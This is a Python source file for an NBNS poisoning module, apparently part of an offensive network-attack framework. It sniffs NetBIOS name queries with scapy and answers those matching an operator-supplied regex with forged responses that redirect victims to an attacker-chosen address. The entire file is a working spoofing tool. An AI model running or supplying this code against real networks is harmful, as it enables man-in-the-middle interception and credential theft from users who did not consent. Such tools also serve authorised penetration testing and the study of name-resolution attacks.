import re
from threading import Thread
from scapy.all import *
from poison import Poison
import util
import config

#
# implements NBNS spoofing as seen in msf.
# Requests are matched based on Python's regex parser.  Careful!
# http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html
#
class nbns(Poison):
	def __init__(self):
		conf.verb = 0
		self.local_mac = get_if_hwaddr(config.get('iface'))
		self.regex_match = None
		self.redirect = None
		self.running = False
		self.dump = False
		super(nbns,self).__init__('NBNS Poison')

	def handler(self,pkt):
		"""Callback for packets"""
		if pkt.haslayer(NBNSQueryRequest):
			request = pkt[NBNSQueryRequest].getfieldval('QUESTION_NAME')
			ret = self.regex_match.search(request.lower())
			if ret is None:
				return

			if not ret.group(0) is None and pkt[Ether].dst != self.local_mac \
						and pkt[IP].src != util.get_local_ip(config.get('iface')): 
				trans_id = pkt[NBNSQueryRequest].getfieldval('NAME_TRN_ID')
				response = Ether(dst=pkt[Ether].src, src=self.local_mac)
				response /= IP(dst=pkt[IP].src)/UDP(sport=137,dport=137)
				response /= NBNSQueryResponse(NAME_TRN_ID=trans_id, RR_NAME=request, NB_ADDRESS=self.redirect)
				del response[UDP].chksum # recalc checksum
				sendp(response)	# layer 2 send for performance
				if self.dump: util.Msg('Spoofing \'%s\' from %s'%(request.strip(), pkt[IP].src))

	def initialize(self):
		"""Initialize spoofer"""
		while True:
			try:
				util.Msg('Using interface [%s:%s]'%(config.get('iface'),self.local_mac))
				tmp = raw_input('[+] Match request regex: ')
				self.regex_match = re.compile(tmp)
				self.redirect = raw_input('[+] Redirect matched requests to: ')
				tmp = raw_input('[!] Match requests with \'%s\' and redirect to \'%s\'.  Is this correct? '\
										%(self.regex_match.pattern, self.redirect))
				if 'n' in tmp.lower():
					return
				break
			except KeyboardInterrupt:
				return False
			except Exception, e:
				print e
				pass

		print '[!] Starting NBNS spoofer...' 
		sniffr = Thread(target=self.sniff_thread)
		sniffr.start()
		self.running = True
		return True

	def sniff_thread(self):
		"""Sniff packets"""
		sniff(filter='udp and port 137', prn=self.handler, store=0, stopper=self.stop_call,
												stopperTimeout=3)

	def stop_call(self):
		"""Stop callback"""
		if self.running:
			return False
		util.debug('nbns spoofer shutdown')
		return True

	def view(self):
		"""Dump packets"""
		try:
			util.Msg('Dumping NBNS poisons...')
			self.dump = True
			raw_input()
			self.dump = False
		except KeyboardInterrupt:
			self.dump = False
			return

	def shutdown(self):
		"""Shutdown sniffer"""
		util.Msg("Shutting down NBNS spoofer...")
		if self.running:
			self.running = False
		return True

	def session_view(self):
		"""Override session viewer"""
		return '%s -> %s'%(self.regex_match.pattern,self.redirect)
